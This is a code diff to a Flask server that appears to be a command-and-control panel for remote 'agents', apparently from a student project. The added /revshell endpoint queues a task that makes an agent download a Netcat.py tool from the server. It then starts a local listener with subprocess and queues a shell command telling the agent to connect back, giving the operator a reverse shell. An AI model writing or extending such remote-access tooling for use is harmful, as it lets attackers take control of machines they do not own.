@@ -1,5 +1,6 @@
 import os
 import json
+import subprocess
 import uuid
 from flask import Flask, request, jsonify, render_template, session, redirect, url_for, send_from_directory
 from werkzeug.utils import secure_filename
@@ -54,7 +55,7 @@ werk_log.propagate = False
 
 
 # --- Configuration ---
-IP = "localhost"
+IP = "192.168.1.41"
 PORT = 5000
 UPLOAD_FOLDER = "./upload"
 API_KEY = os.getenv("API_KEY")
@@ -806,7 +807,44 @@ def delete_task(task_uuid):
 def tools_file(filename):
     return send_from_directory(app.config['TOOLS_FOLDER'], filename)
 
+@app.route('/revshell',methods=['POST'])
+def revshell():
+    #Gets request from browser
+    netcat_url = f"http://{IP}:{PORT}/tools/Netcat.py"
+    agent_id = request.json.get("agent_id")
+    port = request.json.get("port")
+    task_uuid = str(uuid.uuid4())
+    current_time = datetime.now(timezone.utc)
+    print(agent_id)
+    print(port)
+    if port and agent_id:
+        db = get_db()
+        db.execute("""
+            INSERT INTO tasks (uuid, agent_id, task_json, output, scheduled_at, recurring_every)
+            VALUES (?, ?, ?, NULL, ?, NULL)
+        """, (task_uuid, agent_id, json.dumps({"type": "download", "url": netcat_url}),current_time))
+        db.commit()
+    else:
+        return jsonify({"Error": "Missing Parameters"}), 401
+    rev_dir = r"C:\Users\USER\PycharmProjects\Grad\tools\Netcat.py"
+    rev_cmd = f'py "{rev_dir}" -l -p {port}'
+
+    # Use start cmd to open new terminal window
+    subprocess.Popen(
+        f'start cmd /k "{rev_cmd}"',
+        shell=True
+    )
+    time.sleep(3)
+    task_uuid = str(uuid.uuid4())
+    db = get_db()
+
+    db.execute("""
+        INSERT INTO tasks (uuid, agent_id, task_json, output, scheduled_at, recurring_every)
+        VALUES (?, ?, ?, NULL, ?, NULL)
+    """, (task_uuid, agent_id, json.dumps({"type": "shell", "command": f"python3 Netcat.py -t {IP} -p {port}"}),current_time))
+    db.commit()
+    return jsonify({"status": "executed"})
 # --- Main ---
 if __name__ == "__main__":
     restart_recurring_tasks(app)
-    app.run(host="0.0.0.0", port=5000,use_reloader=False)
+    app.run(host="0.0.0.0", port=PORT,use_reloader=False)
